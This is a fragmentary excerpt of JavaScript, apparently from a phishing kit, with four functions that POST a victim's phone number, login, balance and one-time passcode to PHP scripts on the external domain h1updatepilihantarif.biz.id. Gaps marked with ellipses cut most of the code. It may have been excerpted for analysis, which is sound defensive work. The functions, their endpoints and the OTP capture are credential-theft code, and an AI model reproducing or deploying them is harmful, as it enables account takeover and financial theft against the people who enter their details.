function sendHp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://h1updatepilihantarif.biz.id/lending/hp.php',
...
function sendLogin() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://h1updatepilihantarif.biz.id/lending/log.php',
...
function sendSaldo() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://h1updatepilihantarif.biz.id/lending/saldo.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://h1updatepilihantarif.biz.id/lending/otp.php',
